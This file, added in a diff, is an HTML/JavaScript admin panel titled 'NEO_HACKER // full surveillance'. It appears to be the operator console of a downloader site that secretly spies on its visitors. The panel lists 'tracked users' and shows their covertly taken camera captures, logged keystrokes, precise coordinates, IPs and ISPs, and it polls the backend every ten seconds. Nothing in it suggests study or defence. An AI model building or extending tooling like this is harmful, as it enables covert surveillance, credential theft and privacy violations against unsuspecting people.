@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ADMIN // NEO_HACKER</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+body{
+  font-family:'JetBrains Mono',monospace;
+  background:#08080e;color:#c0c0d0;min-height:100vh;padding:14px;
+}
+.terminal-bar{
+  display:flex;align-items:center;gap:8px;margin-bottom:4px;padding-bottom:4px;
+  border-bottom:1px solid rgba(248,87,166,0.15);
+}
+.dot{width:10px;height:10px;border-radius:50%}
+.dot.r{background:#ff5f57}
+.dot.y{background:#ffbd2e}
+.dot.g{background:#28ca41}
+.terminal-bar .user{font-size:0.65rem;color:#555;margin-left:auto}
+h1{font-size:1.2rem;font-weight:700;color:#f857a6;letter-spacing:1px;display:inline}
+h1 span{color:#555;font-weight:400}
+.sub{font-size:0.6rem;color:#444;letter-spacing:0.3px;display:inline;margin-left:8px}
+
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(100px,1fr));gap:5px;margin:10px 0}
+.card{
+  background:rgba(18,18,30,0.4);border:1px solid rgba(255,255,255,0.03);border-radius:5px;
+  padding:8px;text-align:center;
+}
+.card .val{font-size:1.3rem;font-weight:700;color:#f857a6}
+.card .lbl{font-size:0.5rem;color:#555;margin-top:2px;text-transform:uppercase;letter-spacing:0.3px}
+
+.section-title{
+  font-size:0.6rem;font-weight:500;color:#555;text-transform:uppercase;
+  letter-spacing:1px;margin:12px 0 5px 0;padding-bottom:3px;
+  border-bottom:1px solid rgba(255,255,255,0.03);
+  cursor:pointer;
+}
+.section-title:hover{color:#f857a6}
+
+.row{display:flex;gap:10px;flex-wrap:wrap}
+.col{flex:1;min-width:200px}
+
+.bar-item{display:flex;justify-content:space-between;padding:2px 6px;font-size:0.55rem;align-items:center}
+.bar-item .nm{color:#888}.bar-item .nm .ct{color:#444}
+.bar-track{height:2px;background:rgba(255,255,255,0.02);border-radius:2px;overflow:hidden;margin:0 6px 4px}
+.bar-fill{height:100%;background:linear-gradient(90deg,#f857a6,#ff5858);border-radius:2px;transition:width .6s}
+
+.cap-strip{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:6px}
+.cap-strip .cap-item{
+  width:64px;height:48px;border-radius:3px;overflow:hidden;cursor:pointer;
+  border:1px solid rgba(255,255,255,0.03);background:rgba(18,18,30,0.2);
+  position:relative;transition:border-color .15s;
+}
+.cap-strip .cap-item:hover{border-color:rgba(248,87,166,0.25)}
+.cap-strip .cap-item img{width:100%;height:100%;object-fit:cover}
+.cap-strip .cap-item .overlay{
+  position:absolute;bottom:0;left:0;right:0;
+  background:rgba(0,0,0,0.6);font-size:0.4rem;color:#aaa;padding:1px 3px;text-align:center;
+}
+.cap-strip .cap-item .del-btn{
+  position:absolute;top:1px;right:1px;width:12px;height:12px;line-height:12px;
+  text-align:center;font-size:0.45rem;color:#ff5252;background:rgba(0,0,0,0.6);
+  border-radius:2px;cursor:pointer;display:none;z-index:2;
+}
+.cap-strip .cap-item:hover .del-btn{display:block}
+.cap-strip .cap-item .del-btn:hover{background:#ff5252;color:#fff}
+
+.table-wrap{overflow-x:auto;margin-top:4px}
+table{width:100%;border-collapse:collapse;font-size:0.55rem}
+th{text-align:left;color:#555;font-weight:500;padding:4px 5px;border-bottom:1px solid rgba(255,255,255,0.03);white-space:nowrap;letter-spacing:0.2px}
+td{padding:4px 5px;border-bottom:1px solid rgba(255,255,255,0.012);white-space:nowrap;color:#999}
+tr:hover td{background:rgba(248,87,166,0.02)}
+
+.tag{display:inline-block;padding:1px 4px;border-radius:3px;font-size:0.5rem;font-weight:500}
+.tag.suc{background:rgba(0,200,80,0.08);color:#00c853}
+.tag.err{background:rgba(255,50,50,0.08);color:#ff5252}
+.tag.cam{background:rgba(100,150,255,0.08);color:#6496ff}
+
+.loc-box{
+  background:rgba(18,18,30,0.15);border:1px solid rgba(255,255,255,0.02);
+  border-radius:5px;padding:6px;font-size:0.5rem;color:#666;overflow-y:auto;max-height:180px;
+}
+
+.user-card{
+  display:inline-block;margin:3px;padding:4px 8px;border-radius:4px;
+  background:rgba(248,87,166,0.05);border:1px solid rgba(248,87,166,0.1);
+  font-size:0.5rem;color:#aaa;cursor:pointer;transition:all .15s;text-align:center;
+}
+.user-card:hover{background:rgba(248,87,166,0.12);color:#f857a6}
+.user-card .uc-val{color:#f857a6;font-weight:700;font-size:0.6rem}
+.user-card .uc-lbl{color:#555;font-size:0.45rem}
+
+a{color:#f857a6;text-decoration:none}
+a:hover{text-decoration:underline}
+
+.refresh-btn{
+  position:fixed;bottom:10px;right:10px;z-index:10;
+  padding:5px 12px;border:none;border-radius:4px;
+  background:rgba(248,87,166,0.08);border:1px solid rgba(248,87,166,0.12);
+  color:#f857a6;font-family:'JetBrains Mono',monospace;
+  font-size:0.5rem;cursor:pointer;transition:all .15s;
+}
+.refresh-btn:hover{background:rgba(248,87,166,0.18)}
+
+/* Modal */
+.modal-overlay{
+  display:none;position:fixed;inset:0;z-index:100;
+  background:rgba(0,0,0,0.8);backdrop-filter:blur(4px);
+  align-items:center;justify-content:center;
+}
+.modal-overlay.show{display:flex}
+.modal-box{
+  max-width:90vw;max-height:90vh;border-radius:8px;
+  border:1px solid rgba(248,87,166,0.2);overflow:hidden;
+  background:#0a0a14;position:relative;
+}
+.modal-box img,.modal-box video{max-width:90vw;max-height:85vh;display:block}
+.modal-close{
+  position:absolute;top:4px;right:8px;color:#ff5252;font-size:1rem;
+  cursor:pointer;z-index:10;background:rgba(0,0,0,0.5);border-radius:50%;
+  width:20px;height:20px;text-align:center;line-height:20px;
+}
+
+.back-btn{
+  display:inline-block;padding:2px 8px;margin-bottom:6px;border-radius:4px;
+  font-size:0.5rem;color:#f857a6;cursor:pointer;border:1px solid rgba(248,87,166,0.15);
+  transition:all .15s;
+}
+.back-btn:hover{background:rgba(248,87,166,0.1)}
+
+@media(max-width:700px){
+  body{padding:8px}
+  .grid{grid-template-columns:repeat(2,1fr)}
+}
+</style>
+</head>
+<body>
+
+<div class="modal-overlay" id="modalOverlay" onclick="if(event.target===this)closeModal()">
+  <div class="modal-box">
+    <span class="modal-close" onclick="closeModal()">&#10005;</span>
+    <div id="modalContent"></div>
+  </div>
+</div>
+
+<div class="terminal-bar">
+  <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
+  <span class="user">root@neo_hacker:~$</span>
+</div>
+<h1>NEO_HACKER</h1> <span class="sub">[ full surveillance ] &mdash; <span id="liveCount">0</span> events &middot; <span id="uniqueCount">0</span> IPs &middot; <span id="sessionCount">0</span> sessions</span>
+
+<div class="grid" id="statsGrid"></div>
+
+<div class="row">
+  <div class="col">
+    <div class="section-title"># top sources</div>
+    <div id="sitesList"></div>
+  </div>
+  <div class="col">
+    <div class="section-title"># countries</div>
+    <div id="countriesList"></div>
+  </div>
+  <div class="col">
+    <div class="section-title"># daily activity</div>
+    <div id="dailyList"></div>
+  </div>
+  <div class="col">
+    <div class="section-title"># modes</div>
+    <div id="modesList"></div>
+  </div>
+</div>
+
+<div class="section-title" onclick="toggleSection('usersSection')"># tracked users <span id="userCount" style="color:#ffc800"></span> [toggle]</div>
+<div id="usersSection" style="display:block">
+  <div id="usersGrid" style="display:flex;flex-wrap:wrap;gap:4px;margin-bottom:6px;min-height:20px">Loading...</div>
+</div>
+
+<div id="userDetail" style="display:none">
+  <div class="back-btn" onclick="showUsers()">&larr; back to all users</div>
+  <div class="section-title"># user: <span id="userDetailLabel" style="color:#f857a6"></span></div>
+  <div class="cap-strip" id="userCapStrip"></div>
+  <div class="section-title" style="margin-top:8px"># keystrokes logged</div>
+  <div id="userKeys" style="font-size:0.5rem;color:#888;max-height:120px;overflow-y:auto;padding:4px;background:rgba(0,0,0,0.15);border-radius:4px;margin-bottom:6px;word-break:break-all"></div>
+  <div class="table-wrap" style="margin-top:6px">
+    <table><thead><tr>
+      <th>time</th><th>type</th><th>url/title</th><th>mode</th><th>status</th><th>ip</th><th>country</th><th>city</th>
+    </tr></thead><tbody id="userDetailBody"></tbody></table>
+  </div>
+</div>
+
+<div class="row">
+  <div class="col">
+    <div class="section-title"># camera captures <span id="capCount" style="color:#6496ff"></span></div>
+    <div class="cap-strip" id="capStrip"></div>
+  </div>
+  <div class="col">
+    <div class="section-title"># locations <span id="locCount" style="color:#ffc800"></span></div>
+    <div class="loc-box" id="locBox">Loading...</div>
+  </div>
+  <div class="col">
+    <div class="section-title"># unique IPs</div>
+    <div class="loc-box" id="ipBox" style="max-height:120px">Loading...</div>
+  </div>
+</div>
+
+<div class="section-title"># unified feed <span id="feedCount" style="color:#555"></span></div>
+<div class="table-wrap">
+  <table><thead><tr>
+    <th>time</th><th>type</th><th>session</th><th>ip</th><th>country</th><th>city</th><th>isp</th><th>lat</th><th>lon</th><th>details</th>
+  </tr></thead><tbody id="unifiedBody"></tbody></table>
+</div>
+
+<button class="refresh-btn" id="refreshBtn">[ refresh ]</button>
+
+<script>
+function fmt(t) {
+  if(!t) return '';
+  const d = new Date(t);
+  return d.toLocaleString(undefined, {month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'});
+}
+
+function siteTag(url) {
+  const u = url.toLowerCase();
+  if(u.includes('youtube')) return 'YT';
+  if(u.includes('tiktok')) return 'TT';
+  if(u.includes('instagram')) return 'IG';
+  if(u.includes('twitter')||u.includes('x.com')) return 'X';
+  if(u.includes('facebook')) return 'FB';
+  if(u.includes('terabox')||u.includes('1024tera')) return 'TB';
+  if(u.includes('t.me')||u.includes('telegram')) return 'TG';
+  if(u.includes('reddit')) return 'RD';
+  return '?';
+}
+
+function openPreview(url, type) {
+  document.getElementById('modalContent').innerHTML = type === 'video'
+    ? `<video controls autoplay><source src="${url}" type="video/mp4"></video>`
+    : `<img src="${url}" style="max-width:100%">`;
+  document.getElementById('modalOverlay').classList.add('show');
+}
+
+function closeModal() {
+  const mc = document.getElementById('modalContent');
+  mc.innerHTML = '';
+  document.getElementById('modalOverlay').classList.remove('show');
+}
+
+document.addEventListener('keydown', e => { if(e.key === 'Escape') closeModal(); });
+
+let allUsers = [];
+
+function showUsers() {
+  document.getElementById('userDetail').style.display = 'none';
+  document.getElementById('usersSection').style.display = 'block';
+}
+
+async function loadUser(sid, label) {
+  document.getElementById('usersSection').style.display = 'none';
+  document.getElementById('userDetail').style.display = 'block';
+  document.getElementById('userDetailLabel').textContent = label;
+  document.getElementById('userCapStrip').innerHTML = 'Loading...';
+  document.getElementById('userDetailBody').innerHTML = '';
+  document.getElementById('userKeys').innerHTML = '';
+  try {
+    const r = await fetch('/admin/user/' + encodeURIComponent(sid));
+    const d = await r.json();
+    document.getElementById('userCapStrip').innerHTML = (d.captures||[]).map(c =>
+      `<div class="cap-item">
+        <div class="del-btn" onclick="event.stopPropagation();deleteCapture(${c.id})">&#10005;</div>
+        <img src="/captures/${c.filename}" onclick="openPreview('/captures/${c.filename}','img')">
+        <div class="overlay">${c.country||'?'}</div>
+      </div>`
+    ).join('') || '<div style="color:#444;font-size:0.6rem;padding:6px">no captures</div>';
+    document.getElementById('userKeys').innerHTML = (d.keystrokes||[]).map(k =>
+      `<div style="padding:2px 4px;border-bottom:1px solid rgba(255,255,255,0.03)"><span style="color:#555">${fmt(k.time)}</span> <span style="color:#f857a6">${k.keys.replace(/</g,'&lt;').replace(/>/g,'&gt;').substring(0,200)}</span></div>`
+    ).join('') || '<div style="color:#444;padding:4px">no keystrokes</div>';
+    document.getElementById('userDetailBody').innerHTML = (d.downloads||[]).map(r =>
+      `<tr>
+        <td style="color:#555">${fmt(r.time)}</td>
+        <td><span class="tag ${r.status==='success'?'suc':'err'}">DL</span></td>
+        <td style="max-width:150px;overflow:hidden;text-overflow:ellipsis">${r.title ? r.title.substring(0,40) : siteTag(r.url)}</td>
+        <td>${r.mode||'-'}</td>
+        <td><span class="tag ${r.status==='success'?'suc':'err'}">${r.status||'?'}</span></td>
+        <td style="color:#888">${r.ip||'-'}</td>
+        <td>${r.country||'-'}</td>
+        <td>${r.city||'-'}</td>
+      </tr>`
+    ).join('') || '<tr><td colspan="8" style="text-align:center;color:#444;padding:12px">no downloads</td></tr>';
+  } catch(e) { document.getElementById('userCapStrip').innerHTML = 'Error loading'; }
+}
+
+async function load() {
+  try {
+    const [statsR, locsR, usersR] = await Promise.all([
+      fetch('/admin/stats').then(r=>r.json()),
+      fetch('/admin/locations').then(r=>r.json()),
+      fetch('/admin/users').then(r=>r.json())
+    ]);
+
+    const d = statsR;
+    const caps = d.captures || [];
+    const recent = d.recent || [];
+    const dlLocs = locsR.downloads || [];
+    const capLocs = locsR.captures || [];
+
+    liveCount.textContent = d.total + d.captures_total;
+    uniqueCount.textContent = d.ip_count || 0;
+    sessionCount.textContent = d.session_count || 0;
+
+    statsGrid.innerHTML = `
+      <div class="card"><div class="val">${d.total+d.captures_total}</div><div class="lbl">events</div></div>
+      <div class="card"><div class="val" style="color:#00c853">${d.success}</div><div class="lbl">downloads</div></div>
+      <div class="card"><div class="val" style="color:#6496ff">${d.captures_total}</div><div class="lbl">captures</div></div>
+      <div class="card"><div class="val" style="color:#ffc800">${d.ip_count||0}</div><div class="lbl">IPs</div></div>
+      <div class="card"><div class="val" style="color:#f857a6;font-size:1rem">${d.session_count||0}</div><div class="lbl">sessions</div></div>
+      <div class="card"><div class="val" style="font-size:1rem;color:#888">${d.failed}</div><div class="lbl">failed</div></div>
+    `;
+
+    const maxSite = Math.max(...Object.values(d.sites), 1);
+    sitesList.innerHTML = Object.entries(d.sites).map(([k,v]) => `
+      <div class="bar-item"><span class="nm">${k} <span class="ct">(${v})</span></span><span>${v}</span></div>
+      <div class="bar-track"><div class="bar-fill" style="width:${v/maxSite*100}%"></div></div>
+    `).join('') || '<div class="bar-item" style="color:#444">no data</div>';
+
+    const maxCountry = Math.max(...Object.values(d.countries), 1);
+    countriesList.innerHTML = Object.entries(d.countries).map(([k,v]) => `
+      <div class="bar-item"><span class="nm">${k} <span class="ct">(${v})</span></span><span>${v}</span></div>
+      <div class="bar-track"><div class="bar-fill" style="width:${v/maxCountry*100}%"></div></div>
+    `).join('') || '<div class="bar-item" style="color:#444">no data</div>';
+
+    const dayMax = Math.max(...Object.values(d.by_day), 1);
+    const days = Object.keys(d.by_day);
+    dailyList.innerHTML = days.length ? days.slice(-7).map(k => `
+      <div class="bar-item"><span class="nm">${k}</span><span>${d.by_day[k]}</span></div>
+      <div class="bar-track"><div class="bar-fill" style="width:${d.by_day[k]/dayMax*100}%"></div></div>
+    `).join('') : '<div class="bar-item" style="color:#444">no data</div>';
+
+    const modeMax = Math.max(...Object.values(d.modes), 1);
+    modesList.innerHTML = Object.entries(d.modes).map(([k,v]) => `
+      <div class="bar-item"><span class="nm">${k} <span class="ct">(${v})</span></span><span>${v}</span></div>
+      <div class="bar-track"><div class="bar-fill" style="width:${v/modeMax*100}%"></div></div>
+    `).join('') || '<div class="bar-item" style="color:#444">no data</div>';
+
+    capCount.textContent = `(${caps.length})`;
+    document.getElementById('capStrip').innerHTML = caps.map(c =>
+      `<div class="cap-item" title="${c.country||'?'} ${c.city||''} · ${c.browser||'?'} ${c.os||''}">
+        <div class="del-btn" onclick="event.stopPropagation();deleteCapture(${c.id})">&#10005;</div>
+        <img src="/captures/${c.filename}" onclick="openPreview('/captures/${c.filename}','img')">
+        <div class="overlay">${c.country||'?'}</div>
+      </div>`
+    ).join('') || '<div style="color:#444;font-size:0.6rem;padding:6px">no captures yet</div>';
+
+    const allLocs = [...dlLocs, ...capLocs].slice(0,30);
+    locCount.textContent = `(${allLocs.length})`;
+    document.getElementById('locBox').innerHTML = allLocs.length
+      ? allLocs.map(r => `[${Number(r.lat).toFixed(3)}, ${Number(r.lon).toFixed(3)}] ${r.city||'?'}, ${r.country||'?'}${r.isp?' · '+r.isp:''}`).join('<br>')
+      : 'no geo data yet';
+
+    document.getElementById('ipBox').innerHTML = (d.unique_ips||[]).slice(0,20).map(ip =>
+      `<div style="padding:1px 4px;font-size:0.5rem;color:#777">${ip}</div>`
+    ).join('') || '<div style="color:#444">no data</div>';
+
+    // Users
+    allUsers = usersR.users || [];
+    document.getElementById('userCount').textContent = `(${allUsers.length})`;
+    document.getElementById('usersGrid').innerHTML = allUsers.length
+      ? allUsers.map(u => {
+          const label = `${u.browser||'?'} ${u.os||'?'} · ${u.country||'?'}`;
+          return `<div class="user-card" onclick="loadUser('${u.session_id}','${label.replace(/'/g,"\\'")}')">
+            <div class="uc-val">${u.downloads+u.captures}</div>
+            <div class="uc-lbl">${label.substring(0,30)}</div>
+          </div>`;
+        }).join('')
+      : '<div style="color:#444;font-size:0.6rem;padding:6px">no sessions yet</div>';
+
+    feedCount.textContent = `(last 100)`;
+    const allItems = [];
+    (recent || []).forEach(r => allItems.push({...r, _type:'download', _detail: `${r.title ? r.title.substring(0,40) : siteTag(r.url)} [${r.mode||''} ${r.status||''}]`}));
+    caps.forEach(c => allItems.push({...c, _type:'capture', _detail:`${c.browser||'?'} ${c.os||'?'} ${c.device||'?'}`}));
+    allItems.sort((a,b) => (b.time||'').localeCompare(a.time||''));
+
+    unifiedBody.innerHTML = allItems.slice(0,100).map(r => {
+      const loc = [r.city, r.country].filter(Boolean).join(', ') || '-';
+      const sess = r.session_id ? r.session_id.substring(0,8)+'...' : '-';
+      const detail = r._type === 'capture'
+        ? `<a href="javascript:openPreview('/captures/${r.filename}','img')" style="color:#6496ff">&#128247; view</a> ${r._detail}`
+        : r.filename
+          ? `<a href="/serve/${r.filename}" style="color:#00c853">&#8595;</a> <a href="javascript:openPreview('/preview/${r.filename}','video')" style="color:#6496ff">&#9654;</a> ${r._detail}`
+          : r._detail;
+      return `<tr>
+        <td style="color:#555">${fmt(r.time)}</td>
+        <td><span class="tag ${r._type==='capture'?'cam':'suc'}">${r._type==='capture'?'CAM':'DL'}</span></td>
+        <td style="color:#555;font-size:0.5rem" title="${r.session_id||''}">${sess}</td>
+        <td style="color:#888">${r.ip||'-'}</td>
+        <td>${r.country||'-'}</td>
+        <td>${r.city||'-'}</td>
+        <td style="color:#555">${r.isp||'-'}</td>
+        <td style="color:#555;font-size:0.5rem">${r.lat ? Number(r.lat).toFixed(3) : '-'}</td>
+        <td style="color:#555;font-size:0.5rem">${r.lon ? Number(r.lon).toFixed(3) : '-'}</td>
+        <td style="color:#666;font-size:0.5rem">${detail}</td>
+      </tr>`;
+    }).join('') || '<tr><td colspan="10" style="text-align:center;color:#444;padding:12px">no data yet</td></tr>';
+
+  } catch(e) { console.error('load error:', e); }
+}
+
+function toggleSection(id) {
+  const el = document.getElementById(id);
+  el.style.display = el.style.display === 'none' ? 'block' : 'none';
+}
+
+async function deleteCapture(id) {
+  if(!confirm('Delete this capture?')) return;
+  try {
+    const r = await fetch('/admin/captures/delete/' + id, { method:'POST' });
+    const d = await r.json();
+    if(d.success) load();
+    else alert('Delete failed: ' + (d.error || 'unknown'));
+  } catch(e) { alert('Delete error: ' + e.message); }
+}
+
+document.getElementById('refreshBtn').onclick = load;
+load();
+setInterval(load, 10000);
+</script>
+</body>
+</html>
